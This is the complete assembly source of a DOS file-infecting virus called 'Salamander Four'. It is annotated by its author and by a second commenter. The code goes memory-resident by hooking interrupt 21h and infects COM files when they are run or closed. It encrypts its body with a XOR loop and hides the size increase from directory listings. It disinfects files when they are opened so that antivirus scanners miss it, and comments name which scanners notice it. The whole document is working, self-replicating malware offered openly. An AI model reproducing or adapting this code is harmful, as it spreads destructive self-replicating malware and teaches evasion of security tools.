     .model tiny
     .code
     org 100h

resid              equ 3099h
fileid             equ 's'
time_stamp         equ 10001b        ;stealth marker...

   host:
     jmp short entry
     db 90h,fileid

   vstart:
   entry:
     call $+3
     gd:
     mov si,sp
     mov bp, word ptr [si]
     sub bp,offset gd

     lea si, [bp+offset vstart]

     call decrypt                    ;this call will probably trigger fprot!
                                     ;but tbav doesn't note shit...

encrypted_start:
     mov ax,resid
     int 21h
     cmp ax,bx
     je alreadyres                    ;check if already resident

gores:
     mov ax,ds                        ;ds=psp
     dec ax
     mov ds,ax                        ;ds=mcb

     xor di,di
     cmp byte ptr ds:[di],'Z'         ;end of chain ?
     jne nomem

     sub word ptr ds:[di+3],(hend-vstart)/16+1        ;sub dos memory

     sub word ptr ds:[di+12h],(hend-vstart)/16+1      ;get tom from PSP:2 and
     mov ax, word ptr ds:[di+12h]                     ;sub
     mov es,ax                                        ;es=virus segment...

     push cs
     pop  ds

    copy2mem:
     cld
     lea si,[bp+offset vstart]
     xor di,di
     mov cx,(vend-vstart)/2+1
     rep movsw                                          ;copy virus to
                                                        ;allocated memory

    hook21h:
     xor ax,ax
     mov ds,ax                                          ;ds points to int-table
     push ds

     lds ax,ds:[21h*4]
     mov word ptr es:[o21ho-vstart],ax
     mov word ptr es:[o21hs-vstart],ds                  ;store int 21h's vector

     pop ds                ;ds=0

     mov word ptr ds:[21h*4],0
     mov word ptr ds:[21h*4+2],1eh                      ;seg of hole in mem...

     mov byte ptr ds:[1e0h],0eah                        ;jmp dword ptr
     mov word ptr ds:[1e1h],(n21h-vstart)               ; es:n21-vstart
     mov word ptr ds:[1e3h],es                          ;this makes i21h's
                                                        ;vector
                                                        ;point to 0eh:0h and
                                                        ;thats were we placed
                                                        ;a jmp far to
                                                        ;es:(n21h-vstart) ;))
   nomem:
   alreadyres:
   return_com:
     inc sp                ;this is to restore the sp to 0fffeh, done b'cos
     inc sp                ;of the delta offset calc in the begining...
                           ;don't know if it's nessesary thou...

     push cs cs            ;cs=ds=es
     pop es ds

     mov di,100h
     push di
     lea si,[bp+offset hbytes]
     movsw
     movsw

     ret                  ; jmp 100h to start host

;-----------------------------------------------------------------------------
; This is our new int 24h handler. ie. our new critical error handler
; it'll assume no error
  n24h:
     mov al,0
     iret
;-----------------------------------------------------------------------------
;new int 21h handler
; TU>
; This is totally fucked up, he could have used
; direct-jumps for example the stealth-routines,
; but since this is an early beta, he didn't ;).
; Thrust me, this was fixed, too.


n21h:
     cmp ax,resid
     jne exec
     mov bx,resid
     iret                        ;so virus wont load resident twice+

   exec:
     cmp ax,4b00h
     jne cinfect
     jmp infect
   cinfect:
     cmp ah,3eh                ;close ?
     jne odisinf
     jmp close_infect          ;infect!
   odisinf:
     cmp ah,3dh
     jne ext_open
     jmp open_disinfect        ;if it's a file open, then disinfect!
   ext_open:
     cmp ax,6c00h
     jne _11
     jmp extended_open        ;if it's a extended open (F-prot for example...)
   _11:
     cmp ah,11h
     jne _12
     jmp short fcb_stealth   ;stealth during a dos-dir, find first via handles
   _12:
     cmp ah,12h
     jne _4e
     jmp short fcb_stealth                ;stealth during a dos-dir, find next
   _4e:
     cmp ah,4eh
     jne _4f
     jmp short handle_stealth            ;stealth during normal find first
   _4f:
     cmp ah,4fh
     jne o21h
     jmp short handle_stealth           ;stealth during normal find next

o21h: db 0eah
o21ho dw 0
o21hs dw 0                              ;jmp far o21hs:o21ho
      ret                               ;used for calls to old int 21h...
;-----------------------------------------------------------------------------
;This routine will hide the size-increase of an infected .com when using
; 11h/12h or 4eh/4fh

; TU>
; I believe these two routines were put togheter into one in a latter
; version.. Sorry ;).


fcb_stealth:                            ;11h/12h
     pushf
     push cs
     call o21h                          ;fake a call to old int handler
     or al,al
     jnz stealth_error

     pushf
     push ax bx es                   ;dont destroy

     mov ah,51h
     int 21h                            ;get psp addr.

     mov es,bx
     cmp bx,es:[16h]                    ;dos calling?
     jne dont_stealth

     mov bx,dx
     mov al,[bx]                        ;current drive, if al=ffh then ext.fcb

     push ax
     mov ah,2Fh
     int 21h                            ;get dta addr. es:bx
     pop ax

     inc al                             ;if al=ffh => al=00
     jnz regular_fcb                    ;if al=00 then it's an extended fcb

     add     bx,7                       ;skip dos-reserved and attribs...
regular_fcb:
     add bx,3                        ;the byte diffrence between the offset
                                     ;to the filesize using fcb/handles
     mov ax,es:[bx+14h]              ;ax=timestamp        (14h+3=17h ;)
     jmp short stealth_it            ;hide the size

handle_stealth:                      ;4e/4f
     pushf
     push cs
     call o21h                       ;fake int call
     jc stealth_error                ;there was an error so don't stealth
                                     ; (such as no files to find.. )
     pushf
     push ax bx es                   ;save

     mov ah,2fh
     int 21h                         ;get dta addr., es:bx points to it...

     mov ax,es:[bx+16h]              ;get time stamp

stealth_it:

     and al,00011111b                ;kill all but secs...
     xor al,time_stamp               ;xor with our marker
     jnz dont_stealth                 ;not ours :(

     cmp word ptr es:[bx+1ah],(vend-vstart)        ;if fcb bx=bx+3
     jb  dont_stealth                              ;too small to be us...
     cmp word ptr es:[bx+1ch],0                    ;if fcb bx=bx+3
     ja  dont_stealth                              ;too large for us...>64k

     sub word ptr es:[bx+1ah],(vend-vstart)        ;decrease the filesize
     sbb word ptr es:[bx+1ch],0                    ; (* WHY ?? - TU *)

dont_stealth:
     pop es bx ax
     popf

stealth_error:                        ;if there was an error during int call

stealth_done:
     retf 2

;-----------------------------------------------------------------------------
;This is our infection routine, ds:dx points to filename upon entry

infect:
     push ax bx cx dx di si ds es                    ;don't destroy regs/segs
     mov byte ptr cs:(cflag-vstart),0                ;no closeinfection...
   xchg_i24h:
     mov ax,3524h
     int 21h                        ;get int 24h's vector in es:bx
     push es bx                     ;save es:bx so we can restore the handler...

     push ds dx cs                  ;save ds:dx=filename
     pop ds                         ;ds=cs

     mov ah,25h
     mov dx,(n24h-vstart)
     int 21h                        ;set int 24h's vector to our handler

     pop dx ds                      ;ds:dx=filename
     mov ax,4300h
     int 21h
     push cx                        ;get and save attribs

     mov ax,4301h
     push ax ds dx
     xor cx,cx
     int 21h                        ;clear attribs

     call openfile_rw               ;open file r/w

infect_close:
     push cs cs
     pop  ds es                     ;ds=cs=es

     mov ah,3fh
     mov dx,(hbytes-vstart)
     mov cx,4
     int 21h                        ;read first 3 bytes

     cmp byte ptr ds:[hbytes-vstart],'M'
     je jmpclose                              ; *.exe
     cmp byte ptr ds:[hbytes-vstart],'Z'
     jne @okey                                ; *.exe
   jmpclose:
    jmp close
   @okey:
     cmp byte ptr ds:[hbytes-vstart+3],fileid
     je jmpclose                                ; infected by us already

     call get_name                        ;get filename via sft's, in es:di
     cmp word ptr es:[di],'OC'            ;command.com
     je jmpclose                          ;then close the file...

     mov ax,5700h
     int 21h
     push cx dx                           ;read files time/date and save them

     Call Go_eof                          ;go to end of file... ax=filesize on
                                          ;return

     cmp ax,1024
     jb restore
     cmp ax,63000
     ja restore                           ;too small/large ?

     sub ax,3                                    ;jmp entry
     mov word ptr ds:[nbytes-vstart+1],ax        ;save jmp loc

   get_encval:
     mov ah,2ch
     int 21h
     or dl,dl
     jz get_encval                                ;get new value if enc_val=0

     mov word ptr ds:[encval-vstart],dx           ;save it.

   copy2buf:
     cld
     mov ax,8d00h
     mov es,ax                                     ;es=8d00h
     xor si,si
     xor di,di
     mov cx,(vend-vstart)/2+1
     rep movsw                                     ;copy virus to encbuf

   enc_buf:
     mov si,(encrypted_start-vstart)
     call encrypt                        ;encrypt es:si

   write:
     push es
     pop  ds                                ;es=ds=8d00h
     mov ah,40h
     mov cx,(vend-vstart)
     cwd                                    ;write from 8d00h:0000h
     int 21h                                ;write encrypted virus to file

     push cs
     pop ds                                 ;cs=ds

     xor ax,ax
     call move_fp                           ;go to begining of file

     mov ah,40h
     mov cx,4
     mov dx,(nbytes-vstart)
     int 21h                                ;write jmp to virus entry


   restore:
     mov ax,5701h
     pop dx cx

     and cl,11100000b                       ;zero sec's
     or cl,time_stamp                       ;mark with our infection marker
     int 21h                                ;restored files time/date stamp

   close:
     cmp byte ptr cs:(cflag-vstart),1        ;if it is a infection on
     je goon2                                ;close don't close file...
                                             ;and don't restore attribs
     mov ah,3eh
     int 21h

     pop dx ds ax cx                         ;restore ax=4301h, ds:dx=filename
     int 21h

   restore_i24h:
     mov ax,2524h
     pop dx ds                               ;ds:dx points to old int 24h
     int 21h                                 ;handler


   goon2:
     mov byte ptr cs:(cflag-vstart),0          ;no close infection anymore

dah:        pop es ds si di dx cx bx ax        ;restore all segs/regs
duh:        jmp o21h                           ;do old int 21h
;-----------------------------------------------------------------------------
close_infect:
     cmp bx,        4                ;don't close AUX/NULL/CON...
     jbe duh                         ;jmp to jmp to org 21h ;)

     push ax bx cx dx di si ds es        ;don't destroy regs/segs

     call get_name
     add di,8                            ;es:di file ext

     cmp word ptr es:[di],'OC'
     jne noclose
     cmp word ptr es:[di+2],'M'
     jne noclose

     mov byte ptr es:[di-26h],2        ;mark file as open in r/w mode

     xor ax,ax
     call move_fp                        ;go to begining of file

     mov byte ptr cs:(cflag-vstart),1        ;mark it as a close infection...
     jmp infect_close

noclose:
     jmp short dah
     pop es ds si di dx cx bx ax        ;restore all segs/regs
     jmp o21h
;-----------------------------------------------------------------------------
;This routine will disinfect an infected .com file on open!

extended_open:
     cmp dx,1
     je yessir
     jmp o21h                ;don't do anything...
   yessir:
     mov ah,3dh
     mov al,bl
     mov dx,si                ;filename ds:si=ds:dx...
     mov byte ptr cs:(oflag-vstart),1

open_disinfect:                          ;ds:dx=filename...
     push ax bx cx dx di si ds es        ;save all regs/segs...

     push ds
     pop  es                             ;ds=es

     mov cx,64                        ;path+fname= max 65
     mov di,dx                        ;offs to filename
     mov al,'.'                       ;look for '.'
     repne scasb                      ;repeat scansingel byte until cx=0
                                      ;offset to '.'+1 in di
     cmp word ptr ds:[di],'OC'
     je smallc
     cmp word ptr ds:[di],'oc'
     jne nocom
      smallc:
     cmp byte ptr ds:[di+2],'M'
     je openfile
     cmp byte ptr ds:[di+2],'m'
     je openfile                      ;check if it's a com or COM

     nocom:
        jmp no_opendis

     openfile:
     call openfile_rw                 ;open file r/w

     push cs cs
     pop  ds es                       ;cs=ds=es

     mov ax,5700h
     int 21h
     push cx dx                       ;save time/date

   read_f4:
     mov ah,3fh
     mov cx,4
     mov dx,(hbytes-vstart)         ;use hbytes it won't be at first...
     int 21h                        ;read first 4 bytes...

   chk_markers:
     cmp byte ptr ds:[hbytes-vstart+3],fileid        ;ie. our marker
     jne close_dis
     cmp byte ptr ds:[hbytes-vstart],0e9h         ;check if it is a jmp.
     jne close_dis                                ;if itsn't it can't be us...

     call go_eof                                  ;go to end of file,
                                                  ;ax=fsize on return

     mov dx,ax                                    ;store fsize in dx too
     sub ax,(vend-entry+3)
     cmp word ptr ds:[hbytes-vstart+1],ax         ;check if the jmp is to
     jne close_dis                                ;our supposed entry point

     push dx                                      ;push fsize

     xor ax,ax
     sub dx,(vend-hbytes)                         ;goto hbytes offs. in file
     call go_to

     mov ah,3fh
     mov cx,4
     mov dx,(hbytes-vstart)
     int 21h                                      ;store bytes read in memory

     xor ax,ax
     call move_fp                                 ;go tof

     mov ah,40h
     mov dx,(hbytes-vstart)
     mov cx,4
     int 21h

     pop dx

     sub dx,(vend-vstart)                        ;dx=size of original file
     xor ax,ax
     call go_to                                  ;go to bof+cx:dx ie
                                                 ;fsize-vsize

     mov ah,40h
     xor cx,cx
     int 21h                                     ;trunc file....

close_dis:
     mov ax,5701h
     pop dx cx
     int 21h                                     ;restore time/date

     mov ah,3eh
     pushf
     push cs
     call o21h                                   ;close file
no_opendis:                                      ;the file was never opened
     pop es ds si di dx cx bx ax                 ;restore all segs/regs
     cmp byte ptr cs:(oflag-vstart),1
     jne @dduh
     mov ax,6c00h                                ;restore ax
     mov dx,1                                    ;restore dx after
                                                 ;disinfecting...
     mov byte ptr cs:(oflag-vstart),0            ;restore to no-extended open...
@dduh:        jmp o21h
;-----------------------------------------------------------------------------
   get_name:
     push bx
     mov ax,1220h                       ;get jft for handle at es:di
     int 2fh

     mov ax,1216h                       ;get system file table
     mov bl,byte ptr es:[di]            ;for handle index in bx
     int 2fh
     pop bx
     add di,20h                         ;es:di+20h points to file fname

     ret                                ;return
;-----------------------------------------------------------------------------
go_eof:
     mov al,2
move_fp:
     cwd
go_to:
     xor cx,cx
     mov ah,42h
     int 21h
      ret
;-----------------------------------------------------------------------------
;Open file proc. via call to original int 21h... only saves 2 bytes or sumthin
;ds:dx->filename

Openfile_rw:
     mov ax,3d02h
     pushf
     push cs
     call o21h
     xchg bx,ax
     ret                ;return to caller with filehandle in bx...
;-----------------------------------------------------------------------------
;DATA AREA

oflag  db 0                                ;extended open marker
cflag  db 0                                ;close infection marker
tag    db '[- Salamander Four -] (c) by Blonde in 1994'
nbytes db 0e9h,0,0,fileid                ;newbytes

;-----------------------------------------------------------------------------
encrypt_end:

hbytes db 0cdh,20h,0,0                ;HOSTbytes, not ecrypted due to disinfect


;-----------------------------------------------------------------------------
encrypt:decrypt:
     mov cx,(encrypt_end-encrypted_start)/2
  xorl:
     db 26h
     db 81h,34h
encval  dw 0                        ;xor es:[si],encval
     inc si
     inc si
     loop xorl
     ret

vend:                                        ;end of virus code excluding heap
hstart:
hend:                                        ;end of virus code including heap
     end host
================================================================================
